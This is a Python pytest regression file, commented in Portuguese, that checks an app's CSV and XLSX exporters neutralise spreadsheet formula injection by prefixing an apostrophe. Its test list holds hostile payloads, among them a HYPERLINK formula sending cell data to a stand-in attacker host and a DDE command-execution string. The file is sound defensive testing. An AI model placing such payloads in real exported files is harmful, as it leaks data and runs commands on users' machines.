"""
tests/security/test_exporter_injection.py
Testes de regressão para o item #1 de docs/backlog/Fable5/Etapa5.md:
CSV/Formula Injection em gerar_csv/gerar_xlsx.
"""

import csv
import io

import openpyxl
import pytest

from app.shared.exporter import gerar_csv, gerar_xlsx, _neutralizar_formula


GATILHOS = ["=HYPERLINK(\"http://atacante/?d=\"&A1)", "+1+1", "-cmd|'/c calc'!A1", "@SUM(1+1)"]


@pytest.mark.parametrize("valor", GATILHOS)
def test_neutralizar_formula_prefixa_apostrofo(valor: str):
    resultado = _neutralizar_formula(valor)
    assert resultado.startswith("'")
    assert resultado == "'" + valor


def test_neutralizar_formula_preserva_numero_negativo():
    assert _neutralizar_formula(-5) == "-5"
    assert _neutralizar_formula(-5.5) == "-5.5"


def test_neutralizar_formula_string_numerica_negativa_e_neutralizada():
    """Uma STRING "-5" (não um int/float) é tratada como texto arbitrário do
    usuário, não como número — por isso é neutralizada. A distinção que
    importa é o tipo original do dado, não a aparência do texto."""
    assert _neutralizar_formula("-5") == "'-5"


def test_neutralizar_formula_texto_comum_nao_e_alterado():
    assert _neutralizar_formula("Texto normal") == "Texto normal"
    assert _neutralizar_formula(None) == ""


@pytest.mark.parametrize("valor", GATILHOS)
def test_gerar_csv_neutraliza_formula_maliciosa(valor: str):
    csv_out = gerar_csv(["Descricao"], [[valor]])
    # csv.reader desfaz o quoting/escaping do writer, dando o valor real da célula.
    linhas = list(csv.reader(io.StringIO(csv_out.lstrip("﻿")), delimiter=";"))
    celula = linhas[1][0]
    assert celula == "'" + valor
    assert celula != valor


@pytest.mark.parametrize("valor", GATILHOS)
def test_gerar_xlsx_neutraliza_formula_maliciosa(valor: str):
    xlsx_bytes = gerar_xlsx("Teste", ["Descricao"], [[valor]])
    wb = openpyxl.load_workbook(io.BytesIO(xlsx_bytes))
    ws = wb.active
    celula = ws.cell(row=2, column=1).value
    assert celula == "'" + valor


def test_gerar_csv_preserva_numeros_negativos_legitimos():
    csv_out = gerar_csv(["Variacao"], [[-5], [-3.2]])
    assert "-5" in csv_out
    assert "'-5" not in csv_out


def test_gerar_xlsx_preserva_numeros_negativos_legitimos():
    xlsx_bytes = gerar_xlsx("Teste", ["Variacao"], [[-5]])
    wb = openpyxl.load_workbook(io.BytesIO(xlsx_bytes))
    ws = wb.active
    assert ws.cell(row=2, column=1).value == "-5"
